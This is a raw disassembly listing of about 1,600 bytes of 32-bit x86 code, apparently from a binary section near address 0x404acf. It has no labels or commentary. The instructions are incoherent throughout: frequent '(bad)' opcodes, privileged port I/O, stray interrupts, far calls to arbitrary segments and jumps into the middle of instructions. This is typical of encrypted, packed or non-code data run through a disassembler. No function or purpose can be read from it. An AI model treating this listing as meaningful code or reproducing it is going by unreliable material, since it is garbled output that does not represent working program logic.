  404acf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad0:	sub    eax,0x54d6e211
  404ad5:	sub    DWORD PTR [esi+ecx*8-0x15e05fb4],ebx
  404adc:	lahf   
  404add:	int3   
  404ade:	xor    ebp,DWORD PTR [edx+eiz*2-0x53]
  404ae2:	push   0xe7bb3b7
  404ae7:	mov    esp,edi
  404ae9:	add    DWORD PTR [eax],esp
  404aeb:	jno    0x404b1f
  404aed:	dec    esp
  404aee:	cs (bad) 
  404af0:	or     bl,BYTE PTR [eax-0x6d655d5c]
  404af6:	jbe    0x404aa7
  404af8:	xchg   esp,eax
  404af9:	jnp    0x404a86
  404afb:	jmp    0x465c0949
  404b00:	mov    esi,0xfd5d8e1a
  404b05:	jae    0x404aad
  404b07:	iret   
  404b08:	ret    
  404b09:	shl    DWORD PTR [edx+0x24],0x56
  404b0d:	pusha  
  404b0e:	in     eax,dx
  404b0f:	sti    
  404b10:	ret    
  404b11:	add    al,0x52
  404b13:	mov    ebp,0x4118b3c0
  404b18:	xor    bl,ah
  404b1a:	xchg   ecx,edi
  404b1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b1d:	adc    dh,0x8e
  404b20:	ja     0x404b10
  404b22:	lods   al,BYTE PTR ds:[esi]
  404b23:	dec    edi
  404b24:	or     bl,cl
  404b26:	aas    
  404b27:	jg     0x404ad1
  404b29:	push   ds
  404b2a:	mov    eax,0x6f8b435e
  404b2f:	fdiv   QWORD PTR [esp+eax*4]
  404b32:	in     al,dx
  404b33:	dec    edi
  404b34:	cmp    eax,0xd2350b07
  404b39:	jae    0x404adb
  404b3b:	call   FWORD PTR [ebx+0x1f]
  404b3e:	shr    DWORD PTR [edi+ecx*8],cl
  404b41:	jns    0x404b61
  404b43:	pushf  
  404b44:	sbb    eax,0x249ec37b
  404b49:	mov    esp,esp
  404b4b:	jne    0x404b29
  404b4d:	jnp    0x404b39
  404b4f:	cmc    
  404b50:	inc    edi
  404b51:	add    esi,edi
  404b53:	loope  0x404af9
  404b55:	pop    DWORD PTR [ebx-0x33dc0c11]
  404b5b:	cmp    DWORD PTR [eax],esp
  404b5d:	in     eax,0x5
  404b5f:	sub    DWORD PTR [edx],ebp
  404b61:	push   ecx
  404b62:	in     al,dx
  404b63:	stc    
  404b64:	dec    ebx
  404b65:	pop    ebx
  404b66:	arpl   WORD PTR [eax+0x37],si
  404b69:	push   edx
  404b6a:	dec    edi
  404b6b:	mov    eax,ds:0xaea8b995
  404b70:	mov    al,0xcb
  404b72:	(bad)  
  404b73:	xor    al,0x20
  404b75:	jg     0x404baa
  404b77:	or     al,0x2d
  404b79:	das    
  404b7a:	arpl   WORD PTR [ebx+ebp*2],dx
  404b7d:	repz int3 
  404b7f:	call   0x6dcae38f
  404b84:	mov    ch,0x7a
  404b86:	xchg   ecx,eax
  404b87:	aad    0x5c
  404b89:	add    BYTE PTR [edx],dh
  404b8b:	clc    
  404b8c:	outs   dx,DWORD PTR ds:[esi]
  404b8d:	ds cli 
  404b8f:	pop    esi
  404b90:	adc    ch,BYTE PTR [edi+ecx*4+0x2d]
  404b94:	rol    DWORD PTR [edx+0xb2a2633],1
  404b9a:	pop    ds
  404b9b:	jbe    0x404c0a
  404b9d:	enter  0x6f07,0x22
  404ba1:	arpl   cx,dx
  404ba3:	fwait
  404ba4:	leave  
  404ba5:	cmp    ah,BYTE PTR [ecx+0x15b263c9]
  404bab:	push   0xffffffe8
  404bad:	mov    ebx,0x94e44d83
  404bb2:	mov    ah,0x26
  404bb4:	or     al,0x67
  404bb6:	ret    0x5a11
  404bb9:	jbe    0x404be8
  404bbb:	rcr    DWORD PTR [edx],cl
  404bbd:	xor    al,ah
  404bbf:	dec    ecx
  404bc0:	fst    st(7)
  404bc2:	dec    edx
  404bc3:	daa    
  404bc4:	rcr    BYTE PTR [ecx],1
  404bc6:	adc    DWORD PTR [ebx-0x4],edx
  404bc9:	jb     0x404b7d
  404bcb:	mov    dh,0x13
  404bcd:	xchg   esp,eax
  404bce:	xor    al,0x5a
  404bd0:	mov    ds:0x165d7f9b,al
  404bd5:	inc    ecx
  404bd6:	adc    DWORD PTR [ebx],esi
  404bd8:	jb     0x404c1b
  404bda:	or     DWORD PTR ds:0xb65bd973,0x9fb9e6a9
  404be4:	xchg   DWORD PTR [ecx],esi
  404be6:	push   es
  404be7:	mov    ecx,DWORD PTR [edx+0x5b]
  404bea:	mov    esp,eax
  404bec:	sbb    ch,cl
  404bee:	aas    
  404bef:	xor    eax,0x6abfc35e
  404bf4:	call   0xe43a:0x3ffb160d
  404bfb:	xlat   BYTE PTR ds:[ebx]
  404bfc:	ret    
  404bfd:	clc    
  404bfe:	mov    al,0xec
  404c00:	jmp    0x404c4a
  404c02:	rcl    DWORD PTR [ebp+0x39],0xbb
  404c06:	mov    ah,0x8d
  404c08:	push   eax
  404c09:	dec    esi
  404c0a:	lods   al,BYTE PTR ds:[esi]
  404c0b:	icebp  
  404c0c:	xchg   DWORD PTR [esi-0x2cc10d4d],esi
  404c12:	add    bh,dh
  404c14:	stc    
  404c15:	and    ecx,DWORD PTR [eax+esi*2]
  404c18:	cmp    eax,DWORD PTR [ebx+0x14]
  404c1b:	mov    BYTE PTR fs:[edi+0x58990d4c],ah
  404c22:	xchg   edi,eax
  404c23:	and    eax,DWORD PTR [edi]
  404c25:	pusha  
  404c26:	repz cmp ah,BYTE PTR gs:[eax+0x7eb41ba7]
  404c2e:	dec    edx
  404c2f:	outs   dx,BYTE PTR ds:[esi]
  404c30:	iret   
  404c31:	loope  0x404c25
  404c33:	stos   BYTE PTR es:[edi],al
  404c34:	fild   QWORD PTR [eax+edi*8+0x328f39f1]
  404c3b:	mov    ebx,0x7215531f
  404c40:	push   edx
  404c41:	pop    ss
  404c42:	sbb    al,0x59
  404c44:	push   es
  404c45:	js     0x404ca9
  404c47:	arpl   si,dx
  404c49:	jle    0x404bf6
  404c4b:	outs   dx,DWORD PTR ds:[esi]
  404c4c:	jno    0x404cad
  404c4e:	int3   
  404c4f:	inc    edx
  404c50:	jno    0x404c68
  404c52:	dec    eax
  404c53:	or     ebx,0x4d375584
  404c59:	in     eax,0x48
  404c5b:	jb     0x404c2b
  404c5d:	mov    ebx,0xaab033a6
  404c62:	mov    DWORD PTR [eax-0x31],esi
  404c65:	jnp    0x404ccb
  404c67:	repnz call 0x6273:0xf53dad3e
  404c6f:	or     dl,BYTE PTR [esi]
  404c71:	xchg   ch,ah
  404c73:	pop    esp
  404c74:	std    
  404c75:	mov    esi,0xe58cf7c4
  404c7a:	(bad)  
  404c7b:	fstp   DWORD PTR [ebp+ebp*1-0x76e96b18]
  404c82:	push   0x18
  404c84:	(bad)  
  404c85:	(bad)  [edx-0x275534ef]
  404c8b:	adc    BYTE PTR ds:0xb3815544,ah
  404c91:	cmc    
  404c92:	mov    ebx,0xaaaa3d41
  404c97:	xchg   edi,eax
  404c98:	xor    edi,DWORD PTR [ecx-0x670d121a]
  404c9e:	popa   
  404c9f:	loopne 0x404d1b
  404ca1:	pop    ecx
  404ca2:	fild   WORD PTR [ebp-0x31b054f5]
  404ca8:	outs   dx,DWORD PTR ds:[esi]
  404ca9:	lahf   
  404caa:	loop   0x404cd6
  404cac:	ds pop edx
  404cae:	mov    dl,0x2a
  404cb0:	cmp    ebx,DWORD PTR ds:[edi]
  404cb3:	in     eax,dx
  404cb4:	test   BYTE PTR [esi],0x16
  404cb7:	int3   
  404cb8:	shl    DWORD PTR [esi+ebp*8-0x6],1
  404cbc:	pop    es
  404cbd:	fs fs adc eax,0x360485d8
  404cc4:	mov    ebx,0xaecb9d6
  404cc9:	push   esi
  404cca:	test   al,0x2d
  404ccc:	push   esp
  404ccd:	retf   0x3bf5
  404cd0:	adc    eax,0x8c237d1e
  404cd5:	adc    DWORD PTR [edx-0x11382c65],edi
  404cdb:	in     eax,dx
  404cdc:	div    BYTE PTR [ecx]
  404cde:	rcl    BYTE PTR [ebp-0x69],1
  404ce1:	stc    
  404ce2:	pop    es
  404ce3:	jns    0x404d08
  404ce5:	push   edi
  404ce6:	(bad)  [eax]
  404ce8:	data16 icebp 
  404cea:	and    bh,BYTE PTR [edx+0xc]
  404ced:	or     DWORD PTR [ebx-0x7e],ebx
  404cf0:	jno    0x404cf5
  404cf2:	mov    eax,ds:0xdb11acae
  404cf7:	push   ecx
  404cf8:	adc    al,bl
  404cfa:	push   es
  404cfb:	stos   DWORD PTR es:[edi],eax
  404cfc:	rol    DWORD PTR [edi],cl
  404cfe:	in     al,dx
  404cff:	pop    esi
  404d00:	(bad)  
  404d01:	pushf  
  404d02:	and    bh,dh
  404d04:	jecxz  0x404ca8
  404d06:	push   edx
  404d07:	ficom  WORD PTR [ebp+edi*2-0x2af402f2]
  404d0e:	test   DWORD PTR [eax],esi
  404d10:	lock js 0x404c9d
  404d13:	lea    esp,[esi]
  404d15:	test   eax,0xcc857dfe
  404d1a:	in     eax,dx
  404d1b:	mov    edx,0xf14beebd
  404d20:	int    0x18
  404d22:	aam    0xa4
  404d24:	xlat   BYTE PTR ds:[bx]
  404d26:	adc    DWORD PTR [edx],edx
  404d28:	adc    esp,DWORD PTR [edx+ebp*1+0x1a]
  404d2c:	adc    ebx,ebx
  404d2e:	adc    cl,BYTE PTR [edi-0x71857eaf]
  404d34:	loopne 0x404d96
  404d36:	les    ecx,FWORD PTR [ecx]
  404d38:	sbb    al,0xf0
  404d3a:	lock sbb DWORD PTR ds:0x67f205d5,0xffffffde
  404d42:	cld    
  404d43:	pop    ss
  404d44:	jae    0x404cd5
  404d46:	js     0x404cee
  404d48:	sar    DWORD PTR [edx],1
  404d4a:	jo     0x404d33
  404d4c:	inc    esi
  404d4d:	xor    ebx,DWORD PTR [esi+0x5f23bf11]
  404d53:	(bad)  
  404d54:	int3   
  404d55:	sub    cl,BYTE PTR [ebp+eiz*4-0x1a]
  404d59:	cdq    
  404d5a:	fdiv   st,st(7)
  404d5c:	das    
  404d5d:	rol    BYTE PTR [ebx+0x40],0xd1
  404d61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d62:	inc    DWORD PTR [ecx]
  404d64:	mov    ds:0xe16fde6f,al
  404d69:	lahf   
  404d6a:	jge    0x404d20
  404d6c:	push   esi
  404d6d:	sub    DWORD PTR [esi+0x50],esp
  404d70:	leave  
  404d71:	sub    BYTE PTR [esi],ch
  404d73:	push   edx
  404d74:	dec    edx
  404d75:	cmp    BYTE PTR [esi+0x14],cl
  404d78:	or     cl,dh
  404d7a:	mov    al,0x7f
  404d7c:	ins    DWORD PTR es:[edi],dx
  404d7d:	(bad)  [esi-0x187be834]
  404d83:	mov    ebx,DWORD PTR [ecx]
  404d85:	cmovbe edx,DWORD PTR [ecx+0x3e0321e5]
  404d8c:	or     ebp,DWORD PTR [ecx+0x49]
  404d8f:	not    BYTE PTR [ebp-0xc]
  404d92:	clc    
  404d93:	cwde   
  404d94:	fnstcw WORD PTR [esi+0x46657fc3]
  404d9a:	test   al,0x6c
  404d9c:	or     eax,0xa8236eed
  404da1:	sar    BYTE PTR [edi+ecx*2+0x3a],cl
  404da5:	out    dx,al
  404da6:	jb     0x404d9d
  404da8:	or     bh,BYTE PTR [esi-0x31]
  404dab:	data16 jno 0x404daf
  404dae:	outs   dx,DWORD PTR ds:[esi]
  404daf:	fsub   QWORD PTR gs:[ebx+0x39ac7bf4]
  404db6:	mov    eax,ds:0x4252cdc1
  404dbb:	jo     0x404dc9
  404dbd:	imul   esi,DWORD PTR [eiz*1-0x6a93ee2],0xc960714d
  404dc8:	stos   DWORD PTR es:[edi],eax
  404dc9:	scas   eax,DWORD PTR es:[edi]
  404dca:	lods   al,BYTE PTR ds:[esi]
  404dcb:	push   esp
  404dcc:	sbb    ebp,DWORD PTR [eax-0x41155f95]
  404dd2:	ror    BYTE PTR [edi+ebp*1],cl
  404dd5:	es ret 0x8412
  404dd9:	xchg   DWORD PTR [ebp+0x37],edx
  404ddc:	jno    0x404e49
  404dde:	cmp    edi,DWORD PTR [ebp-0x69270cb8]
  404de4:	outs   dx,BYTE PTR ds:[esi]
  404de5:	pop    esp
  404de6:	xchg   ebx,eax
  404de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de8:	mov    WORD PTR [esi+0x68530d3e],ds
  404dee:	lea    eax,[ecx+0x2e92e48f]
  404df4:	mov    ecx,0x2faac180
  404df9:	sub    DWORD PTR [eax],ebp
  404dfb:	push   0xd789c4a5
  404e00:	adc    cl,BYTE PTR [ecx-0x3b1f3352]
  404e06:	rol    BYTE PTR [ecx+edx*4],1
  404e09:	mov    edx,0xdf2313da
  404e0e:	addr16 (bad) 
  404e10:	popf   
  404e11:	push   es
  404e12:	lahf   
  404e13:	sti    
  404e14:	dec    ebp
  404e15:	push   esp
  404e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e17:	cmp    BYTE PTR [edi+ebp*8+0x2a],0xa9
  404e1c:	pop    ss
  404e1d:	or     DWORD PTR [esi-0x1179a924],eax
  404e23:	nop
  404e24:	xor    al,0x27
  404e26:	push   ecx
  404e27:	call   0xbe1ead44
  404e2c:	inc    edx
  404e2d:	jbe    0x404ea2
  404e2f:	mov    eax,ds:0xc912128c
  404e34:	fincstp 
  404e36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e37:	mov    cl,0x8c
  404e39:	jno    0x404e09
  404e3b:	ins    BYTE PTR es:[edi],dx
  404e3c:	mov    eax,ds:0x3be3bd14
  404e41:	ins    DWORD PTR es:[edi],dx
  404e42:	jns    0x404e4b
  404e44:	popa   
  404e45:	or     DWORD PTR [ebx+0x35d00e49],eax
  404e4b:	xor    cl,ah
  404e4d:	or     bh,BYTE PTR [eax-0x29d56c9d]
  404e53:	out    dx,eax
  404e54:	shl    BYTE PTR [eax],cl
  404e56:	xchg   ebx,eax
  404e57:	xor    al,0xa9
  404e59:	rol    DWORD PTR [esi+0x7c6fb089],cl
  404e5f:	loop   0x404e89
  404e61:	mov    BYTE PTR [eax+0xa6beb2a],cl
  404e67:	popa   
  404e68:	enter  0x58de,0x1a
  404e6c:	aam    0x3e
  404e6e:	pop    esi
  404e6f:	and    BYTE PTR [ebx+0x24],al
  404e72:	push   esp
  404e73:	nop
  404e74:	mov    dh,0x35
  404e76:	fadd   QWORD PTR [esi+ebx*1+0x55b51522]
  404e7d:	mov    ch,0x79
  404e7f:	pop    edx
  404e80:	push   DWORD PTR [edx+0x6e2b080a]
  404e86:	sbb    ebp,DWORD PTR ds:[ebp+0x5e]
  404e8a:	and    dl,al
  404e8c:	shl    cl,cl
  404e8e:	xlat   BYTE PTR ss:[ebx]
  404e90:	and    DWORD PTR [ebx-0x110bb583],eax
  404e96:	sub    BYTE PTR [ecx+0x45e49b02],dl
  404e9c:	push   0x1c
  404e9e:	jecxz  0x404e45
  404ea0:	xor    DWORD PTR [edx],esi
  404ea2:	and    ecx,edi
  404ea4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ea5:	or     al,0x15
  404ea7:	mov    ah,bl
  404ea9:	mov    al,0xdf
  404eab:	mov    ebp,edx
  404ead:	cdq    
  404eae:	ss icebp 
  404eb0:	push   edi
  404eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eb2:	lock fadd st,st(7)
  404eb5:	dec    ecx
  404eb6:	js     0x404efe
  404eb8:	iret   
  404eb9:	retf   
  404eba:	mov    al,0xb0
  404ebc:	sbb    eax,0xb73d3571
  404ec1:	push   ecx
  404ec2:	xor    ecx,0x11
  404ec5:	out    0x31,eax
  404ec7:	sahf   
  404ec8:	add    esi,edi
  404eca:	dec    DWORD PTR [edi+0x2df25f2b]
  404ed0:	jo     0x404eb8
  404ed2:	pop    ss
  404ed3:	out    dx,al
  404ed4:	icebp  
  404ed5:	in     al,dx
  404ed6:	xchg   ebp,eax
  404ed7:	xor    dl,BYTE PTR [edi-0x4969006c]
  404edd:	jnp    0x404eee
  404edf:	xchg   edi,eax
  404ee0:	push   esp
  404ee1:	and    ebp,ebx
  404ee3:	push   edx
  404ee4:	inc    ecx
  404ee5:	cmp    al,0x7b
  404ee7:	sbb    DWORD PTR [eax+0x288db731],0x6aa55e54
  404ef1:	inc    edx
  404ef2:	jecxz  0x404f12
  404ef4:	jmp    0x404f70
  404ef6:	addr16 pushf 
  404ef8:	ret    0x3d93
  404efb:	mov    edx,0xf1ba5744
  404f00:	je     0x404ee3
  404f02:	mov    ch,0x96
  404f04:	pop    ss
  404f05:	lock add DWORD PTR [eax-0x56],0x7f
  404f0a:	cmp    al,0x23
  404f0c:	mov    esp,0x85ecb868
  404f11:	repnz and edx,DWORD PTR [esi+0x8]
  404f15:	push   ebx
  404f16:	sub    al,0xd8
  404f18:	cmp    dl,al
  404f1a:	mov    edx,0xf4622db
  404f1f:	std    
  404f20:	xor    DWORD PTR [ecx],ebp
  404f22:	cwde   
  404f23:	and    DWORD PTR [ecx],ebp
  404f25:	pop    edx
  404f26:	dec    esi
  404f27:	sbb    eax,0x2640798a
  404f2c:	popf   
  404f2d:	sub    edi,DWORD PTR [edx-0x6b]
  404f30:	sub    BYTE PTR [ebx+ebx*2+0x31207898],0x7
  404f38:	mov    ds:0xbbe4e9c6,eax
  404f3d:	lods   eax,DWORD PTR ds:[esi]
  404f3e:	nop
  404f3f:	inc    ebx
  404f40:	push   es
  404f41:	mov    esi,DWORD PTR [edi+0x2f]
  404f44:	sub    DWORD PTR [ebx+0x795bf41c],ecx
  404f4a:	stc    
  404f4b:	mov    eax,0xcb68fe02
  404f50:	pop    edi
  404f51:	ins    DWORD PTR es:[edi],dx
  404f52:	push   ds
  404f53:	xchg   ebx,eax
  404f54:	mov    bh,0xe1
  404f56:	and    BYTE PTR [eax+0x64f2106],ah
  404f5c:	mov    ss,WORD PTR [esi-0x2]
  404f5f:	mov    ecx,0xcadb03fc
  404f64:	fstp   QWORD PTR [esi]
  404f66:	sbb    BYTE PTR [ecx],bl
  404f68:	adc    ch,BYTE PTR [edi]
  404f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f6b:	mov    esp,DWORD PTR [ecx]
  404f6d:	push   edx
  404f6e:	imul   esp,DWORD PTR [eax+ebp*2+0x48],0xe2287663
  404f76:	xchg   esp,eax
  404f77:	jge    0x404fc6
  404f79:	mov    eax,0xa78d3ba5
  404f7e:	(bad)  
  404f7f:	rcl    BYTE PTR [ecx],1
  404f81:	fadd   QWORD PTR [edi-0x3ac5fe6a]
  404f87:	inc    eax
  404f88:	and    eax,0xf540794
  404f8d:	daa    
  404f8e:	jl     0x404fd6
  404f90:	lds    ecx,FWORD PTR [esi-0x48]
  404f93:	arpl   WORD PTR [ebx+eiz*4],sp
  404f96:	mov    dl,0xa3
  404f98:	loop   0x404f41
  404f9a:	imul   ebx,DWORD PTR [eax-0x5c456b40],0x35
  404fa1:	ret    0xae9c
  404fa4:	iret   
  404fa5:	inc    ebx
  404fa6:	and    eax,0x2499dc8d
  404fab:	and    al,0x20
  404fad:	ror    BYTE PTR [edx-0x5c],0xdc
  404fb1:	mov    esi,0x5806b51a
  404fb6:	test   DWORD PTR [edi-0x340df6a1],esp
  404fbc:	imul   DWORD PTR [edx-0x6f85183a]
  404fc2:	pop    edi
  404fc3:	imul   edx,ecx,0xffffff9d
  404fc6:	retf   
  404fc7:	xchg   ecx,eax
  404fc8:	mov    al,0x6e
  404fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fcb:	mov    cl,BYTE PTR [ecx]
  404fcd:	mov    al,ds:0xfc7fdf6e
  404fd2:	xchg   edx,eax
  404fd3:	js     0x404fde
  404fd5:	in     eax,0x14
  404fd7:	es xchg bl,bh
  404fda:	call   eax
  404fdc:	cli    
  404fdd:	addr16 push ss
  404fdf:	dec    esi
  404fe0:	mov    al,ds:0xda1c20cc
  404fe5:	pushf  
  404fe6:	xor    al,0x4b
  404fe8:	add    BYTE PTR [edi+eax*8],cl
  404feb:	popa   
  404fec:	pop    ds
  404fed:	xor    al,0xdc
  404fef:	std    
  404ff0:	pop    esp
  404ff1:	lods   al,BYTE PTR ds:[esi]
  404ff2:	dec    ecx
  404ff3:	ins    BYTE PTR es:[edi],dx
  404ff4:	push   es
  404ff5:	mov    ds:0x7fbffc7d,al
  404ffa:	push   eax
  404ffb:	aad    0xe9
  404ffd:	sub    dl,BYTE PTR [esi+ebx*8+0x2205af7c]
  405004:	pop    ds
  405005:	shl    BYTE PTR [edx],0x90
  405008:	push   cs
  405009:	enter  0x749d,0x4a
  40500d:	cwde   
  40500e:	mov    ebx,0x960789a1
  405013:	stc    
  405014:	test   DWORD PTR [esi+0x7e],esi
  405017:	jns    0x404fc1
  405019:	adc    eax,0x85bfbbec
  40501e:	inc    ebp
  40501f:	bound  edi,QWORD PTR [ebx-0x3e]
  405022:	(bad)  [ebp-0x2f1eeb96]
  405028:	enter  0x6490,0x81
  40502c:	xchg   esi,eax
  40502d:	cdq    
  40502e:	div    DWORD PTR [ecx]
  405030:	and    DWORD PTR [eax+0x3c],edx
  405033:	dec    ebp
  405034:	in     eax,dx
  405035:	out    dx,al
  405036:	fsub   QWORD PTR [ecx+0x443fb78e]
  40503c:	inc    edi
  40503d:	(bad)  
  40503e:	std    
  40503f:	xor    esp,DWORD PTR [eax+0x4a]
  405042:	icebp  
  405043:	xchg   BYTE PTR [edi-0x28],cl
  405046:	lods   al,BYTE PTR ds:[esi]
  405047:	sub    dl,BYTE PTR [edi-0x66]
  40504a:	jnp    0x405057
  40504c:	dec    esp
  40504d:	(bad)  ds:0xcc538156
  405053:	push   cs
  405054:	sbb    cl,BYTE PTR [edx+0x15]
  405057:	sub    al,0xa7
  405059:	cli    
  40505a:	je     0x40501e
  40505c:	rcl    BYTE PTR [eax+ecx*4+0x497f107],cl
  405063:	test   cl,ch
  405065:	loope  0x404fee
  405067:	sbb    BYTE PTR [ebp-0x60],dh
  40506a:	sbb    eax,0x353226f7
  40506f:	test   al,al
  405071:	pop    ebx
  405072:	cmp    BYTE PTR [eax-0x22],bl
  405075:	jb     0x4050a3
  405077:	imul   eax,DWORD PTR [ebx-0x72],0xffffffcc
  40507b:	cmp    ch,BYTE PTR [ecx+0xd]
  40507e:	pop    edi
  40507f:	sub    BYTE PTR [edx-0x33],bl
  405082:	adc    eax,0xf0cd5ada
  405087:	shl    DWORD PTR [ecx-0x5c682b9f],0xdd
  40508e:	aam    0x79
  405090:	ja     0x40508d
  405092:	popa   
  405093:	mov    al,ds:0xc4ea6120
  405098:	ins    DWORD PTR es:[edi],dx
  405099:	call   0x5bf7acef
  40509e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40509f:	xchg   edx,eax
  4050a0:	les    edx,FWORD PTR [edi-0x446e1e6c]
  4050a6:	pop    eax
  4050a7:	repz push eax
  4050a9:	xchg   edx,eax
  4050aa:	adc    BYTE PTR [eax+0x3a],0xae
  4050ae:	out    0x3a,al
  4050b0:	mov    ?,WORD PTR [edi]
  4050b2:	sub    DWORD PTR [edi+0x4572a1e3],edx
  4050b8:	daa    
  4050b9:	or     bh,BYTE PTR [esi-0x65]
  4050bc:	and    ch,bh
  4050be:	inc    eax
  4050bf:	rol    DWORD PTR [ecx+0x65da9d8d],cl
  4050c5:	mov    ch,0x5d
  4050c7:	addr16 daa 
  4050c9:	mov    ah,0x70
  4050cb:	dec    edi
  4050cc:	shl    BYTE PTR [edx],1
  4050ce:	aas    
  4050cf:	jmp    0x4e97:0xe86bcce3
  4050d6:	inc    edi
  4050d7:	in     eax,0x9
  4050d9:	mov    gs,WORD PTR [esi-0x21]
  4050dc:	fdiv   DWORD PTR ds:0x81baace9
  4050e2:	mov    bl,0xab
  4050e4:	cmc    
  4050e5:	jl     0x405140
  4050e7:	dec    edx
  4050e8:	xchg   ebp,eax
  4050e9:	sub    edx,DWORD PTR es:0xc97ed0ab
  4050f0:	xchg   bh,cl
  4050f2:	es (bad) 
  4050f4:	out    dx,al
  4050f5:	mov    esp,0xfa84486c
  4050fa:	fistp  DWORD PTR [esi]
  4050fc:	mov    al,ds:0xd12be489
  405101:	xchg   ebp,eax
  405102:	and    al,0x14
  405104:	aad    0xcb
  405106:	dec    esp
  405107:	adc    al,0x4c
  405109:	adc    BYTE PTR [esi-0x5b667a84],0x5
  405110:	mov    ecx,0x657c3e21
  405115:	push   ebx
  405116:	xlat   BYTE PTR ds:[ebx]
  405117:	adc    ebp,eax
  405119:	aam    0xb0
  40511b:	mov    esp,0x39f19003
  405120:	mov    esi,0x2c5c71af
  405125:	push   edi
  405126:	fst    DWORD PTR [edi+edx*8+0x5a]
  40512a:	push   eax
  40512b:	add    ebx,DWORD PTR [edi+0x7e5e7ab4]
  405131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405132:	lock and bl,0x18
  405136:	int    0x29
  405138:	out    dx,al
  405139:	cmp    eax,0x90ddbcff
  40513e:	jmp    0x38e52f66
  405143:	xor    edx,DWORD PTR [esi+0xa]
  405146:	jp     0x4050c9
  405148:	sub    eax,0xd497bbcb
  40514d:	ds xor ah,cl
  405150:	enter  0xdce8,0xbe
  405154:	lds    esi,FWORD PTR [ecx]
  405156:	jno    0x405190
  405158:	daa    
  405159:	pushf  
  40515a:	(bad)  
  40515b:	sub    al,0xd
  40515d:	inc    ecx
  40515e:	gs xchg esp,eax
  405161:	pusha  
  405162:	cmp    DWORD PTR [edx],0xdffde583
  405168:	lahf   
  405169:	xchg   esp,eax
  40516a:	adc    ecx,esp
  40516c:	push   cs
  40516d:	sbb    ebx,DWORD PTR [ecx+edi*1+0x2f8b622b]
  405174:	mov    eax,0x94304498
  405179:	lea    esp,[ebp+0x22eb7d67]
  40517f:	or     DWORD PTR ds:[edx+0x4],edx
  405183:	xchg   edi,eax
  405184:	loopne 0x4051fc
  405186:	mov    ch,0x98
  405188:	out    dx,al
  405189:	mov    edi,0xf5becbf6
  40518e:	xchg   edx,eax
  40518f:	dec    DWORD PTR [esi]
  405191:	ret    
  405192:	div    BYTE PTR [edx+eax*1+0x2925650d]
  405199:	retf   0x4a4a
  40519c:	fcom   QWORD PTR [edx+0x19]
  40519f:	push   ds
  4051a0:	int    0x12
  4051a2:	pop    edi
  4051a3:	out    0xc4,al
  4051a5:	fild   DWORD PTR [ebp+0x3e22135a]
  4051ab:	lea    edx,[eax-0x591fb179]
  4051b1:	sbb    ah,BYTE PTR [edx]
  4051b3:	mov    ah,0xac
  4051b5:	mov    esp,0x5b792ce8
  4051ba:	(bad)  
  4051bb:	dec    edi
  4051bc:	sti    
  4051bd:	dec    eax
  4051be:	add    edi,esp
  4051c0:	outs   dx,DWORD PTR ds:[esi]
  4051c1:	popa   
  4051c2:	cld    
  4051c3:	int3   
  4051c4:	inc    ebx
  4051c5:	loop   0x405155
  4051c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c8:	ret    
  4051c9:	sub    eax,DWORD PTR [eax+0x7dec841f]
  4051cf:	(bad)  
  4051d0:	jecxz  0x405197
  4051d2:	fadd   DWORD PTR [esi]
  4051d4:	cmp    BYTE PTR [ebx+0x47],bl
  4051d7:	push   ds
  4051d8:	daa    
  4051d9:	push   edi
  4051da:	loopne 0x40516e
  4051dc:	dec    esi
  4051dd:	inc    eax
  4051de:	inc    ecx
  4051df:	mov    dh,0x1f
  4051e1:	push   ds
  4051e2:	fstp   QWORD PTR [edi]
  4051e4:	adc    eax,0xb9a12273
  4051e9:	push   ebx
  4051ea:	pop    esi
  4051eb:	lahf   
  4051ec:	mov    edi,0x497e1d40
  4051f1:	xor    DWORD PTR [ebx-0x74],esi
  4051f4:	les    ebx,FWORD PTR [ecx-0x3f6c9cc6]
  4051fa:	jl     0x405257
  4051fc:	mov    cs,WORD PTR [ecx]
  4051fe:	pop    esi
  4051ff:	fxch   st(2)
  405201:	rep ins DWORD PTR es:[edi],dx
  405203:	inc    ebx
  405204:	mov    bh,0xed
  405206:	or     BYTE PTR [ecx-0x3a9ac878],cl
  40520c:	ror    BYTE PTR [ecx+0xb],cl
  40520f:	mov    al,BYTE PTR [edx+ebp*8+0x3d]
  405213:	and    DWORD PTR [ebp+0x22],0x6943ae93
  40521a:	(bad)  
  40521b:	sbb    al,0x54
  40521d:	out    dx,al
  40521e:	dec    eax
  40521f:	enter  0xd10,0xe4
  405223:	call   0x689b1774
  405228:	or     ah,BYTE PTR [esp+eax*4+0x67]
  40522c:	out    0xf9,eax
  40522e:	ret    0x9067
  405231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405232:	mov    ecx,DWORD PTR [esi+edi*4+0x75]
  405236:	fidivr DWORD PTR [ebx+0x65fdf90b]
  40523c:	aas    
  40523d:	mov    ah,0x1a
  40523f:	popa   
  405240:	(bad)  
  405241:	mov    ebx,0x444ed6e4
  405246:	mov    eax,ds:0xb334f5af
  40524b:	ss jp  0x4052b9
  40524e:	stc    
  40524f:	sbb    ah,BYTE PTR [eax-0x5b]
  405252:	mov    dl,0xd6
  405254:	xor    al,0x92
  405256:	call   0xc10:0x56cee6d7
  40525d:	add    ch,ch
  40525f:	push   esi
  405260:	std    
  405261:	fild   QWORD PTR [ecx]
  405263:	mov    cl,0xae
  405265:	push   0xfffffff0
  405267:	xor    DWORD PTR [edx-0x24],ebp
  40526a:	add    edx,DWORD PTR [ebx-0xe]
  40526d:	in     al,dx
  40526e:	mov    esi,0xe1ec22c8
  405273:	mov    BYTE PTR [ebp-0x72],dh
  405276:	cmp    esi,DWORD PTR [edi+edx*4-0x1c73b107]
  40527d:	dec    ebx
  40527e:	push   ss
  40527f:	ja     0x405238
  405281:	test   DWORD PTR [edi-0x1c],edx
  405284:	adc    al,0x5b
